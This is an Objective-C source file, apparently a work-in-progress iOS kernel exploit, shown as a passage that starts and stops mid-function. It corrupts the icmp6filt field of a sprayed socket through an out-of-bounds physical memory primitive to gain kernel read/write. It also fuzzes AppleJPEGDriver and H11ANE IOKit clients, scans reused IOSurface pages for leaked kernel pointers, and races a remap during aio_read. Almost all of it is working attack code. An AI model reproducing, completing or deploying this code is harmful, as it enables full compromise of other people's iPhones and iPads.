    // hit down to 0x400 and read inpcb fields from there; the executable name
    // lives in a fileglob/vnode, NOT at a fixed offset inside the inpcb, so the
    // misalignment planted kernel-heap pointers into the wrong fields of LIVE
    // sockets -> so_count (socket+0x208) corrupted -> "Kernel data abort ...
    // far: 0x00000fdf880cfa29" panics (observed on-device, 3 runs).
    uint64_t pcbStartOffset = 0;
    uint64_t icmp6filtOffset = OFFSET_ICMP6FILT; // 0x148 confirmed on this kernel
    uint64_t corruptedFilterMarker = 0x0000ffffffffffffULL;
    bool targetFound = false;
    const char *matchedMarker = NULL;

    for (uint64_t searchStartIdx = 0; searchStartIdx < OOB_SIZE;) {
        void *bestFound = NULL;
        const char *bestMarker = NULL;
        for (int mi = 0; mi < gProcessMarkerCount; mi++) {
            const char *marker = gProcessMarkers[mi];
            size_t ml = strnlen(marker, PROCESS_MARKER_MAX_LEN);
            if (ml == 0) continue;
            void *candidate = memmem((uint8_t*)rBuf + searchStartIdx, OOB_SIZE - searchStartIdx, marker, ml);
            if (candidate && (!bestFound || candidate < bestFound)) {
                bestFound = candidate;
                bestMarker = marker;
            }
        }
        if (!bestFound) break;

        uint64_t foundOffset = (uint8_t*)bestFound - (uint8_t*)rBuf;
        gNameHits++;
        void *filterFound = reverse_memmem(rBuf, foundOffset, &corruptedFilterMarker, sizeof(corruptedFilterMarker));
        if (filterFound) {
            uint64_t filterOffset = (uint8_t*)filterFound - (uint8_t*)rBuf;
            if (filterOffset >= icmp6filtOffset + 0x8) {
                uint64_t candidatePcbStartOffset = filterOffset - (icmp6filtOffset + 0x8);
                if (candidatePcbStartOffset + icmp6filtOffset + 0x10 <= OOB_SIZE) {
                    pcbStartOffset = candidatePcbStartOffset;
                    matchedMarker = bestMarker;
                    targetFound = true;
                    break;
                }
            }
        }
        searchStartIdx = foundOffset + 1;
    }
    if (!targetFound) {
        gRejZero++;
        return -1;
    }
    printf("[+] inpcb via process marker '%s': pcb_start_offset=0x%llx filt_marker=0x%llx\n",
        matchedMarker ?: "?", (unsigned long long)pcbStartOffset,
        (unsigned long long)corruptedFilterMarker);
    fflush(stdout);

    uint64_t tg = *(uint64_t*)((uintptr_t)rBuf + pcbStartOffset + 0x78);
    printf("[dbg] target_inp_gencnt(+0x78)=0x%llx\n", (unsigned long long)tg);
    fflush(stdout);
    if (tg == ((NSNumber*)[(NSMutableArray*)socketPcbIds lastObject]).unsignedLongLongValue) {
        gRejGencnt++;
        printf("[dbg] candidate rejected: tg==last 0x%llx\n", (unsigned long long)tg);
        return -1;
    }

    int csi = -1;
    for (int i = 0; i < [socketPorts count]; i++) {
        if ([(NSNumber*)socketPcbIds[i] unsignedLongLongValue] == tg) {
            csi = i; break;
        }
    }
    if (csi < 0 || [(NSMutableArray*)usedGc containsObject:@(tg)]) {
        gRejCsi++;
        printf("[dbg] candidate rejected: csi=%d used=%d tg=0x%llx\n",
            csi, [(NSMutableArray*)usedGc containsObject:@(tg)] ? 1 : 0, (unsigned long long)tg);
        return -1;
    }
    [usedGc addObject:@(tg)];

    // inpcb list next: LIST_ENTRY at inpcb+0x20, its le_next points at the
    // next inpcb's LIST_ENTRY (+0x20), so next inpcb base = *(pcb+0x28) - 0x20.
    // (off_inpcb_inp_list_le_next = 0x20; reads at +0x20+0x8 = +0x28.)
    uint64_t inpListNextPtr = *(uint64_t*)((uintptr_t)rBuf + pcbStartOffset + 0x20 + 0x8);
    uint64_t inpNext = inpListNextPtr - 0x20;
    printf("[dbg] inp_list_next_pointer(+0x28)=0x%llx -> inpNext=0x%llx\n",
        (unsigned long long)inpListNextPtr, (unsigned long long)inpNext);
    fflush(stdout);

    // PCB B ("rwSocketPcb") must look like a canonical kalloc.1024 inpcb, else
    // the first 0x20-byte KRW write through set_kaddr() would hit freed memory.
    if ((inpNext >> 40) != 0xFFFFFF) {
        printf("[-] PCB B rejected: not kernel heap 0x%llx\n", inpNext);
        return -1;
    }
    socketCsi = csi;
    rwSocketPcb = inpNext;

    if (!leakedPorts) leakedPorts = [NSMutableSet new];
    [leakedPorts addObject:[(NSMutableArray*)socketPorts objectAtIndex:csi]];
    int sock = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi] unsignedLongLongValue]);
    printf("[dbg] control fd=%d\n", sock);
    fflush(stdout);

    // Single targeted plant (lara): overwrite control's icmp6filt with the rw
    // owner's icmp6filt slot address, zero the next qword. Then getsockopt(control)
    // copies 0x20 bytes from the rw inpcb's icmp6filt field; success iff the
    // first qword is not all-ones (a fresh filter is 0xffffffffffffffff).
    memcpy(wBuf, rBuf, OOB_SIZE);
    *(uint64_t*)((uintptr_t)wBuf + pcbStartOffset + icmp6filtOffset) = inpNext + icmp6filtOffset;
    *(uint64_t*)((uintptr_t)wBuf + pcbStartOffset + icmp6filtOffset + 8) = 0;

    printf("[+] corrupting control icmp6filt -> rw icmp6filt slot (0x%llx)...\n",
        (unsigned long long)(inpNext + icmp6filtOffset));
    fflush(stdout);
    uint64_t corruptAttempt = 0;
    while (1) {
        phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, wBuf);
        phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
        uint64_t newIcmp6filter = *(uint64_t*)((uintptr_t)rBuf + pcbStartOffset + icmp6filtOffset);
        if ((corruptAttempt < 8 || (corruptAttempt % 16) == 0) || newIcmp6filter != inpNext + icmp6filtOffset) {
            printf("[dbg] corrupt attempt %llu: new_icmp6filter=0x%llx (want 0x%llx)\n",
                (unsigned long long)corruptAttempt, (unsigned long long)newIcmp6filter,
                (unsigned long long)(inpNext + icmp6filtOffset));
            fflush(stdout);
        }
        if (newIcmp6filter == inpNext + icmp6filtOffset) {
            printf("[+] target corrupted: 0x%llx\n", (unsigned long long)newIcmp6filter);
            fflush(stdout);
            break;
        }
        corruptAttempt++;
    }

    uint8_t gd[0x20]; socklen_t gl = 0x20;
    int gso = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, gd, &gl);
    if (gso != 0) {
        printf("[-] getsockopt failed (corrupt check)! gso=%d\n", gso);
        fflush(stdout);
        return -1;
    }
    uint64_t marker = *(uint64_t*)gd;
    if (marker != 0xffffffffffffffffULL) {
        controlSocket = sock;
        gIcmp6FiltOffset = icmp6filtOffset;
        rwSocket = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi + 1] unsignedLongLongValue]);
        [leakedPorts addObject:[(NSMutableArray*)socketPorts objectAtIndex:csi + 1]];
        gSocketsCorrupted = true;
        printf("[+] found control_socket at idx: %d (marker=0x%llx), rw idx=%d\n",
            csi, (unsigned long long)marker, csi + 1);
        fflush(stdout);
        return 0;
    }
    printf("[-] failed to corrupt control_socket at idx: %d (marker=0xffffffffffffffff)\n", csi);
    fflush(stdout);
    return -1;
}

// ===== IOKit Diagnostic =====

struct iokit_test {
    const char *name;
    const char *service;
    uint32_t type;
};

static bool test_iokit_service(const char *name, const char *path, uint32_t type) {
    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
        IOServiceNameMatching(path));
    if (!svc) {
        svc = IORegistryEntryFromPath(MACH_PORT_NULL, path);
    }
    if (!svc) {
        printf("[IOKit] %s: service not found\n", name);
        return false;
    }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, type, &conn);
    if (kr != KERN_SUCCESS) {
        printf("[IOKit] %s @ %s: IOServiceOpen failed (%#x)\n", name, path, kr);
        IOObjectRelease(svc);
        return false;
    }
    printf("[IOKit] %s @ %s: OPENED (conn=%#x)\n", name, path, conn);
    IOServiceClose(conn);
    IOObjectRelease(svc);
    return true;
}

static void try_open_service(const char *name, uint32_t type, bool multiType) {
    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
        IOServiceNameMatching(name));
    if (!svc) {
        if (!multiType) printf("[IOKit] %s: not found\n", name);
        return;
    }
    if (multiType) {
        for (uint32_t t = 0; t <= 3; t++) {
            io_connect_t conn = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self_, t, &conn);
            printf("[IOKit] %s type=%u: %s (conn=%#x, kr=%#x)\n",
                   name, t, kr == KERN_SUCCESS ? "OPENED" : "no UC", conn, kr);
            if (conn) IOServiceClose(conn);
        }
    } else {
        io_connect_t conn = 0;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self_, type, &conn);
        printf("[IOKit] %s: %s (conn=%#x, kr=%#x)\n",
               name, kr == KERN_SUCCESS ? "OPENED" : "no UC", conn, kr);
        if (conn) IOServiceClose(conn);
    }
    IOObjectRelease(svc);
}

static void diagnostic_iokit(void) {
    printf("\n=== IOKit Diagnostic ===\n");
    const char *svcNames[] = {
        "IOSurfaceRoot", "AppleJPEGDriver", "AGXDevice", "AGX14Device",
        "AGX13Device", "H11ANEIn", "H11ANE", "AppleANE",
        "IOAudioEngine", "IOHDACodecDriver", "AppleT8112Device",
        "IOPlatformExpertDevice", "AppleEmbeddedSPI",
        "AppleCL2", "AppleDCP", "AppleAVE2Driver", "AppleH11CameraInterface",
        "AppleSPUDevice", "AppleDCPExtension", "AppleCSIReceiver",
        "AppleSmartIO2", "AppleT8112DART", "IOGPU",
    };
    for (int i = 0; i < sizeof(svcNames)/sizeof(svcNames[0]); i++) {
        if (strcmp(svcNames[i], "H11ANE") == 0)
            try_open_service(svcNames[i], 0, true);
        else if (strcmp(svcNames[i], "AppleJPEGDriver") == 0) {
            // Try types 0-3 for JPEG too
            io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
                IOServiceNameMatching("AppleJPEGDriver"));
            if (svc) {
                for (uint32_t t = 0; t <= 3; t++) {
                    io_connect_t conn = 0;
                    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, t, &conn);
                    printf("[IOKit] AppleJPEGDriver type=%u: %s (conn=%#x, kr=%#x)\n",
                           t, kr == KERN_SUCCESS ? "OPENED" : "no UC", conn, kr);
                    if (conn) IOServiceClose(conn);
                }
                IOObjectRelease(svc);
            } else {
                printf("[IOKit] AppleJPEGDriver: not found\n");
            }
        } else
            try_open_service(svcNames[i], 0, false);
    }
    printf("=== IOKit Diagnostic Complete ===\n\n");
}

// ===== AppleJPEGDriver Struct + Type Fuzzer =====
// Tries all 4 user-client types with struct inputs of varying sizes



static void method_jpeg_size_scan(void) {
    printf("\n[Method: JPEG_size] Exhaustive struct size scan for AppleJPEGDriver...\n");
    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
        IOServiceNameMatching("AppleJPEGDriver"));
    if (!svc) { printf("[JPEG_size] service not found\n"); return; }

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 0, &conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) { printf("[JPEG_size] IOServiceOpen failed: %#x\n", kr); return; }
    printf("[JPEG_size] connection=%d\n", conn);

    // Create IOSurfaces for JPEG decode
    int imgW = 64, imgH = 64;
    IOSurfaceRef inputSurf = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (__bridge id)kIOSurfaceAllocSize : @(imgW * imgH * 4),
        (__bridge id)kIOSurfaceWidth : @(imgW),
        (__bridge id)kIOSurfaceHeight : @(imgH),
        (__bridge id)kIOSurfaceBytesPerRow : @(imgW * 4),
        (__bridge id)kIOSurfacePixelFormat : @(0x34323066),
        (__bridge id)kIOSurfaceBytesPerElement : @(4),
    });
    IOSurfaceRef outputSurf = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (__bridge id)kIOSurfaceAllocSize : @(imgW * imgH * 4),
        (__bridge id)kIOSurfaceWidth : @(imgW),
        (__bridge id)kIOSurfaceHeight : @(imgH),
        (__bridge id)kIOSurfaceBytesPerRow : @(imgW * 4),
        (__bridge id)kIOSurfacePixelFormat : @(0x42475241),
        (__bridge id)kIOSurfaceBytesPerElement : @(4),
    });
    if (!inputSurf || !outputSurf) {
        printf("[JPEG_size] IOSurfaceCreate failed\n");
        if (inputSurf) CFRelease(inputSurf);
        if (outputSurf) CFRelease(outputSurf);
        IOServiceClose(conn);
        return;
    }
    uint32_t srcID = IOSurfaceGetID(inputSurf);
    uint32_t dstID = IOSurfaceGetID(outputSurf);

    // Copy JPEG data to input surface
    IOSurfaceLock(inputSurf, 0, NULL);
    size_t jpegBytes = sizeof(kTinyJPEG) < (size_t)(imgW * imgH * 4) ? sizeof(kTinyJPEG) : (imgW * imgH * 4);
    memcpy(IOSurfaceGetBaseAddress(inputSurf), kTinyJPEG, jpegBytes);
    IOSurfaceUnlock(inputSurf, 0, NULL);

    // Test 1: methods 0 and 2 with scalar 0/0
    printf("\n[JPEG_size] --- Scalar 0/0 test ---\n");
    uint32_t scalarOut[4] = {};
    uint32_t scalarCnt = 4;
    for (uint32_t m = 0; m < 16; m++) {
        kr = IOConnectCallMethod(conn, m, NULL, 0, NULL, 0,
            scalarOut, &scalarCnt, NULL, NULL);
        printf("[JPEG_size] method=%d scalar(0,0): kr=%#x outCnt=%u\n", m, kr, scalarCnt);
    }

    // Test 2: exhaustive struct size scan for methods 0-7
    printf("\n[JPEG_size] --- Exhaustive struct size scan (0-256, step 4) ---\n");
    uint8_t buf[512];
    size_t outSize = sizeof(buf);

    for (uint32_t m = 0; m < 8; m++) {
        int hits = 0;
        for (size_t sz = 0; sz <= 256; sz += 4) {
            memset(buf, 0, sizeof(buf));
            // Fill struct with likely field values
            if (sz >= 4) {
                // Try IOSurfaceID at offset 0 (Alyssa layout)
                *(uint32_t*)(buf + 0) = srcID;
            }
            if (sz >= 8) {
                // Try size at offset 4 (Alyssa: jpeg_file_size)
                *(uint32_t*)(buf + 4) = (uint32_t)jpegBytes;
            }
            if (sz >= 12) {
                // Try dest surface at offset 8
                *(uint32_t*)(buf + 8) = dstID;
            }
            if (sz >= 16) {
                // Try dest buffer size at offset 12
                *(uint32_t*)(buf + 12) = imgW * imgH * 4;
            }
            // Fill remaining with reasonable decode params
            if (sz >= 24) {
                *(uint32_t*)(buf + 20) = imgW;  // pixel_x / width
                *(uint32_t*)(buf + 24) = imgH;  // pixel_y / height
            }

            outSize = sizeof(buf);
            kr = IOConnectCallStructMethod(conn, m, buf, sz, buf, &outSize);

            if (kr != 0xe00002c2) {
                hits++;
                printf("[JPEG_size] method=%d sz=%zu: kr=%#x outSize=%zu", m, sz, kr, outSize);
                if (outSize > 0 && outSize <= 512) {
                    printf(" data[0..7]=");
                    for (int i = 0; i < 8 && i < (int)outSize; i++)
                        printf("%02x", buf[i]);
                }
                printf("\n");
            }
        }
        printf("[JPEG_size] method=%d: %d hits (non-E02C2)\n", m, hits);
    }

    // Test 3: try specific sizes from known struct definitions
    printf("\n[JPEG_size] --- Targeted sizes from known structs ---\n");
    const size_t targetedSizes[] = {40, 60, 76, 80, 88, 96, 100, 104, 108, 112, 116, 120, 124, 128};
    for (uint32_t m = 1; m <= 3; m += 2) {  // methods 1 and 3 (startDecoder/startEncoder)
        for (int si = 0; si < sizeof(targetedSizes)/sizeof(targetedSizes[0]); si++) {
            size_t sz = targetedSizes[si];
            memset(buf, 0, sizeof(buf));
            *(uint32_t*)(buf + 0) = srcID;
            if (sz >= 8) *(uint32_t*)(buf + 4) = (uint32_t)jpegBytes;
            if (sz >= 12) *(uint32_t*)(buf + 8) = dstID;
            if (sz >= 16) *(uint32_t*)(buf + 12) = imgW * imgH * 4;
            if (sz >= 24) { *(uint32_t*)(buf + 20) = imgW; *(uint32_t*)(buf + 24) = imgH; }

            outSize = sizeof(buf);
            kr = IOConnectCallStructMethod(conn, m, buf, sz, buf, &outSize);
            printf("[JPEG_size] method=%d sz=%zu (targeted): kr=%#x outSize=%zu\n",
                   m, sz, kr, outSize);
        }
    }

    CFRelease(inputSurf);
    CFRelease(outputSurf);
    IOServiceClose(conn);
    printf("[JPEG_size] complete\n");
}

// ===== ImageIO Trace =====
// Decode a real JPEG via ImageIO, check if result is IOSurface-backed

static void method_imageio_trace(void) {
    printf("\n[Method: ImageIO] Tracing real JPEG decode via ImageIO...\n");
    NSData *jpegData = [NSData dataWithBytesNoCopy:(void*)kTinyJPEG
                                            length:sizeof(kTinyJPEG)
                                      freeWhenDone:NO];
    CGImageSourceRef src = CGImageSourceCreateWithData((__bridge CFDataRef)jpegData, NULL);
    if (!src) { printf("[ImageIO] source create failed\n"); return; }

    CGImageRef img = CGImageSourceCreateImageAtIndex(src, 0, NULL);
    CFRelease(src);
    if (!img) { printf("[ImageIO] image decode failed\n"); return; }

    size_t w = CGImageGetWidth(img), h = CGImageGetHeight(img);
    printf("[ImageIO] decoded: %zux%zu\n", w, h);

    // Try private API CGImageGetIOSurface
    static IOSurfaceRef (*sCGImageGetIOSurface)(CGImageRef) = NULL;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        sCGImageGetIOSurface = dlsym(RTLD_DEFAULT, "CGImageGetIOSurface");
    });
    IOSurfaceRef surf = sCGImageGetIOSurface ? sCGImageGetIOSurface(img) : NULL;
    if (surf) {
        uint32_t sid = IOSurfaceGetID(surf);
        printf("[ImageIO] IOSurface-backed! sid=%u size=%zux%zu fmt=%#x\n",
               sid, IOSurfaceGetWidth(surf), IOSurfaceGetHeight(surf),
               IOSurfaceGetPixelFormat(surf));

        // Try calling JPEGDriver methods with this known-good surface
        io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
            IOServiceNameMatching("AppleJPEGDriver"));
        if (svc) {
            io_connect_t conn = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 0, &conn);
            if (kr == KERN_SUCCESS) {
                printf("[ImageIO] Trying JPEGDriver methods with ImageIO surface...\n");
                for (uint32_t m = 0; m < 8; m++) {
                    uint64_t args[4] = {sid, sid, 0, 0};
                    size_t outSz = 32;
                    uint64_t out[4] = {};
                    kr = IOConnectCallMethod(conn, m, args, 4, NULL, 0,
                        out, (uint32_t*)&outSz, NULL, NULL);
                    if (kr == KERN_SUCCESS)
                        printf("[ImageIO] JPEGDriver m=%d w/IO surface: SUCCESS\n", m);
                }
                IOServiceClose(conn);
            }
            IOObjectRelease(svc);
        }
    } else {
        printf("[ImageIO] not IOSurface-backed (fallback render or bitmap)\n");
        // Check data provider type
        CGDataProviderRef dp = CGImageGetDataProvider(img);
        if (dp) printf("[ImageIO] has data provider\n");
    }

    CFRelease(img);
    printf("[ImageIO] trace complete\n");
}

// ===== H11ANE (Neural Engine) Fuzzer =====
static io_connect_t gH11Conn = 0;

static bool open_h11ane(void) {
    if (gH11Conn) return true;
    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
        IOServiceNameMatching("H11ANE"));
    if (!svc) { printf("[H11ANE] service not found\n"); return false; }
    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 1, &gH11Conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) { printf("[H11ANE] IOServiceOpen type=1: %#x\n", kr); return false; }
    printf("[H11ANE] conn=%#x (type=1)\n", gH11Conn);
    return true;
}

static void method_h11ane_fuzz(void) {
    printf("\n[Method: H11ANE_fuzz] Fuzzing H11ANE Neural Engine...\n");
    if (!open_h11ane()) { printf("[H11ANE] Cannot open\n"); return; }

    int e02c2Count = 0, otherErrorCount = 0, successCount = 0;
    uint32_t firstOtherMethod = 0, firstOtherKr = 0;

    // Method enumeration: try 0-63 with scalar args, struct args, output
    for (uint32_t m = 0; m < 64; m++) {
        // Pattern A: zero inputs
        uint64_t outBuf[8] = {};
        size_t outSz = sizeof(outBuf);
        kern_return_t kr = IOConnectCallMethod(gH11Conn, m,
            NULL, 0, NULL, 0, outBuf, (uint32_t*)&outSz, NULL, NULL);
        if (kr == KERN_SUCCESS) {
            successCount++;
            printf("[H11ANE] method %d (zero): SUCCESS kr=0 outSz=%zu", m, outSz);
            for (int i = 0; i < 8 && outSz >= 8; i++)
                if (outBuf[i]) printf(" out[%d]=0x%llx", i, outBuf[i]);
            printf("\n");
        } else if (kr != 0xe00002c2) {
            otherErrorCount++;
            if (otherErrorCount == 1) { firstOtherMethod = m; firstOtherKr = kr; }
            printf("[H11ANE] method %d (zero): kr=%#x (!= E02C2)\n", m, kr);
        } else {
            e02c2Count++;
        }
    }

    // Try IOConnectCallStructMethod with IOSurface
    IOSurfaceRef aneSurf = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (__bridge id)kIOSurfaceAllocSize : @(0x100000),
        (__bridge id)kIOSurfaceWidth : @(256),
        (__bridge id)kIOSurfaceHeight : @(256),
        (__bridge id)kIOSurfaceBytesPerRow : @(1024),
        (__bridge id)kIOSurfacePixelFormat : @(0x34323066),
        (__bridge id)kIOSurfaceBytesPerElement : @(4),
    });
    if (aneSurf) {
        uint32_t sid = IOSurfaceGetID(aneSurf);
        int surfOk = 0;
        for (uint32_t m = 0; m < 16; m++) {
            uint64_t args[4] = {sid, 0, 0, 0};
            size_t outSz = 32;
            uint64_t out[4] = {};
            kern_return_t kr = IOConnectCallMethod(gH11Conn, m,
                args, 4, NULL, 0, out, (uint32_t*)&outSz, NULL, NULL);
            if (kr == KERN_SUCCESS) {
                printf("[H11ANE] method %d w/ surface: SUCCESS\n", m);
                surfOk++;
            }
        }
        printf("[H11ANE] surface methods success: %d/16\n", surfOk);
        CFRelease(aneSurf);
    }

    IOServiceClose(gH11Conn);
    gH11Conn = 0;
    printf("[H11ANE] fuzz complete: %d success, %d E02C2, %d other (first other: method %u kr=%#x)\n",
           successCount, e02c2Count, otherErrorCount, firstOtherMethod, firstOtherKr);
}

// ===== Multi-Method Exploit =====

// Method 1: Enhanced SystemMemory scan — check ALL pages for kernel pointers
static bool method_system_memory(void) {
    printf("\n[Method: SystemMemory] Creating IOSurface with SystemMemory...\n");
    mach_vm_size_t sz = OOB_PAGES_NUM * PAGE_SIZE;
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(sz),
        @"IOSurfaceMemoryRegion" : @"SystemMemory",
    };
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surface) {
        printf("[SystemMemory] IOSurfaceCreate failed\n");
        return false;
    }
    void *addr0 = IOSurfaceGetBaseAddress(surface);
    printf("[SystemMemory] addr0=%p\n", addr0);

    randomMarker = (uint64_t)arc4random() << 32 | arc4random();
    printf("[SystemMemory] marker=0x%016llx\n", randomMarker);
    memset64(addr0, randomMarker, sz);

    socketPorts = [NSMutableArray new];
    socketPcbIds = [NSMutableArray new];
    int n = 0;
    for (int i = 0; i < (10240 * 3 - 4096 * 2); i++) {
        if (spray_socket() == -1) break;
        n++;
    }
    printf("[SystemMemory] sprayed %d sockets\n", n);

    CFRelease(surface);
    printf("[SystemMemory] IOSurface released, pages freed\n");

    IOSurfaceRef surface2 = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surface2) {
        printf("[SystemMemory] IOSurfaceCreate #2 failed\n");
        sockets_release();
        return false;
    }
    void *addr1 = IOSurfaceGetBaseAddress(surface2);
    printf("[SystemMemory] addr1=%p\n", addr1);

    // Full-page scan — report ALL non-marker words, not just first
    uint64_t *words = (uint64_t *)addr1;
    uint64_t total = sz / 8;
    int hits = 0, ptrHits = 0;
    for (uint64_t i = 0; i < total; i++) {
        if (words[i] != randomMarker) {
            hits++;
            uint64_t v = words[i];
            // Check if it looks like a kernel pointer (0xfffffff0... range)
            if ((v >> 40) == 0xFFFFFF) {
                printf("[SystemMemory] KPTR at +%#llx: 0x%016llx\n", i * 8, v);
                ptrHits++;
            } else if (hits <= 20) {
                printf("[SystemMemory] non-marker at +%#llx: 0x%016llx\n", i * 8, v);
            }
        }
    }
    printf("[SystemMemory] total non-marker words: %d (kernel pointers: %d)\n", hits, ptrHits);

    CFRelease(surface2);
    sockets_release();
    return hits > 0;
}

// Method 2: AIO cross-mapping exploit — uses shared physical pages + FILE (not pipe)
// aio_read from a file into shared pages (dual memory entries)
static bool method_aio_exploit(void) {
    printf("\n[Method: AIO_Exploit] Testing AIO with dual mappings + file...\n");

    mach_vm_size_t pgSz = 16 * PAGE_SIZE;
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(pgSz),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surface) { printf("[AIO_Exploit] IOSurfaceCreate failed\n"); return false; }

    void *physBase = IOSurfaceGetBaseAddress(surface);
    printf("[AIO_Exploit] IOSurface physBase=%p\n", physBase);

    // Two memory entries from same physical pages
    mach_port_t entry1 = MACH_PORT_NULL, entry2 = MACH_PORT_NULL;
    mach_vm_size_t meSz = pgSz;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &meSz,
        (mach_vm_address_t)physBase, VM_PROT_DEFAULT, &entry1, 0);
    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] entry1: %s\n", mach_error_string(kr)); CFRelease(surface); return false; }

    kr = mach_make_memory_entry_64(mach_task_self(), &meSz,
        (mach_vm_address_t)physBase, VM_PROT_DEFAULT, &entry2, 0);
    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] entry2: %s\n", mach_error_string(kr)); mach_port_deallocate(mach_task_self_, entry1); CFRelease(surface); return false; }

    // Map at two different VAs
    mach_vm_address_t vaA = 0, vaB = 0;
    kr = mach_vm_map(mach_task_self(), &vaA, pgSz, 0,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, entry1, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] map A: %s\n", mach_error_string(kr)); goto cleanup; }

    kr = mach_vm_map(mach_task_self(), &vaB, pgSz, 0,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, entry2, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] map B: %s\n", mach_error_string(kr)); mach_vm_deallocate(mach_task_self_, vaA, pgSz); goto cleanup; }

    printf("[AIO_Exploit] vaA=0x%llx vaB=0x%llx\n", vaA, vaB);

    // Fill with marker
    memset64((void*)vaA, 0xAA, pgSz);

    // Create a temp file for AIO
    char tmpPath[1024];
    confstr(_CS_DARWIN_USER_TEMP_DIR, tmpPath, 1024);
    char fn[64]; snprintf(fn, 64, "/aio_%u", arc4random());
    strlcat(tmpPath, fn, 1024);
    {
        void *z = calloc(1, 0x10000);
        FILE *f = fopen(tmpPath, "w"); fwrite(z, 1, 0x10000, f); fclose(f);
        free(z);
    }
    int fd = open(tmpPath, O_RDWR);
    fcntl(fd, F_NOCACHE, 1);
    remove(tmpPath);

    // Write test data to the file (at non-zero offset to verify aio_read position)
    uint8_t fileData[0x100];
    for (int i = 0; i < sizeof(fileData); i++) fileData[i] = 0xBB;
    pwrite(fd, fileData, sizeof(fileData), 0);

    // Test 1: Basic aio_read from file into shared VA_B — verify cross-mapping works
    printf("[AIO_Exploit] Test 1: aio_read from file into VA_B...\n");
    struct aiocb aio;
    memset(&aio, 0, sizeof(aio));
    aio.aio_fildes = fd;
    aio.aio_buf = (void*)(vaB + 0x1000);
    aio.aio_nbytes = 0x100;
    aio.aio_offset = 0;
    aio.aio_sigevent.sigev_notify = SIGEV_NONE;

    kr = aio_read(&aio);
    printf("[AIO_Exploit] aio_read=%d (errno=%d)\n", kr, errno);
    if (kr != 0) { printf("[AIO_Exploit] aio_read failed, aborting\n"); close(fd); goto cleanup; }

    const struct aiocb *list[1] = {&aio};
    aio_suspend(list, 1, NULL);
    kr = aio_error(&aio);
    size_t n = aio_return(&aio);
    printf("[AIO_Exploit] aio_error=%d aio_return=%zu\n", kr, n);

    // Check if data arrived via VA_A (same physical pages)
    uint8_t *viaA = (uint8_t*)(vaA + 0x1000);
    uint8_t *viaB = (uint8_t*)(vaB + 0x1000);
    printf("[AIO_Exploit] Via VA_A: %02x %02x %02x %02x (%s marker)\n",
           viaA[0], viaA[1], viaA[2], viaA[3],
           viaA[0] == 0xBB ? "OK" : "MISMATCH");
    printf("[AIO_Exploit] Via VA_B: %02x %02x %02x %02x\n",
           viaB[0], viaB[1], viaB[2], viaB[3]);

    // Test 2: aio_read with REMAP during I/O
    printf("[AIO_Exploit] Test 2: aio_write with remap during I/O...\n");

    // Write different data to file
    pwrite(fd, fileData, sizeof(fileData), 0x2000);
    fileData[0] = 0xCC;
    pwrite(fd, fileData, sizeof(fileData), 0x2000);

    memset(&aio, 0, sizeof(aio));
    aio.aio_fildes = fd;
    aio.aio_buf = (void*)(vaB + 0x2000);
    aio.aio_nbytes = 0x100;
    aio.aio_offset = 0x2000;
    aio.aio_sigevent.sigev_notify = SIGEV_NONE;

    // Fill target with marker first
    memset64((void*)(vaB + 0x2000), 0xDD, 0x100);

    kr = aio_read(&aio);
    printf("[AIO_Exploit] aio_read(test2)=%d\n", kr);

    // During I/O, deallocate and remap vaB to different entry
    mach_vm_address_t oldVaB = vaB;
    // Remap: change pages backing vaB
    mach_vm_deallocate(mach_task_self_, vaB, pgSz);
    kr = mach_vm_map(mach_task_self_, &vaB, pgSz, 0,
        VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, entry2, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    printf("[AIO_Exploit] remapped vaB, kr=%d\n", kr);

    aio_suspend(list, 1, NULL);
    kr = aio_error(&aio);
    n = aio_return(&aio);
    printf("[AIO_Exploit] Test2: aio_error=%d aio_return=%zu\n", kr, n);

    // Read results — data should be at the remapped location
    uint8_t *viaA2 = (uint8_t*)(vaA + 0x2000);
    uint8_t *viaB2 = (uint8_t*)(vaB + 0x2000);
    printf("[AIO_Exploit] Test2 via VA_A: %02x %02x...\n", viaA2[0], viaA2[1]);
